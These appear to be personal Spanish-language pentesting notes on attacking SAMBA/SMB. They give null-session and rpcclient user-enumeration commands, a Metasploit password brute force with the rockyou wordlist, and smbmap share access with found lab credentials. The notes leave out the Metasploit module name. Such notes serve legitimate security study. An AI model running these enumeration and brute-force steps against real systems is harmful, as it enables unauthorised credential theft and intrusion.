
SAMBA sirve para que los sistemas operativos que no sean Windows puedan comunicarse con sistemas que si usen SMB

Para la enumeración de usuarios usaremos la herramienta
### [[RPCCLIENT]]

Para empezar deberemos usar el siguiente comando
`smbclient //<IP_Victima>/<recurso> -N`

Una vez en la consola de [[RPCCLIENT]] usaremos las siguientes ordenes para empezar la enumeración
- Primero debemos de ejecutar
`srvinfo` Nos muestra información del SO

- Segundo ejecutar
`querydispinfo` Nos muestra Usuarios

- Tercero a ejecutar
`enumdomusers` Nos muestra Usuarios

Ahora ya con[[METASPLOIT]] podremos hacer el ataque de fuerza bruta
Usaremos el modulo
Vemos las opciones de configuración con `show options`
Configuramos los parámetros que son necesarios
`set <Opciones> <Parametro>` 
- RPORT `445`
- RHOST `IPVictima`
- SMBUser `nombre usuario si lo conocemos`
- SMBPass `contraseña si la conocemos`
- PASS_FILE `/usr/share/wordlists/rockyou.txt`  Diccionario en caso de no saber contraseñas
- VERBOSE `false`

Una vez tengamos todo configurado usaremos el comando `run` para ejecutar el exploit
Ahora ya podemos seguir con la explotación usando [[00. Apuntes/01. Herramientas/SMBMAP|SMBMAP]] o [[00. Apuntes/01. Herramientas/SMBCLIENT|SMBCLIENT]]
Con [[00. Apuntes/01. Herramientas/SMBMAP|SMBMAP]] seria así
` smbmap -H 192.168.1.31 -u 'ken' -p 'kenken'`

Para acceder a un recurso compartido usaríamos el parámetro `-r` 
` smbmap -H 192.168.1.31 -u 'ken' -p 'kenken' -r ken`


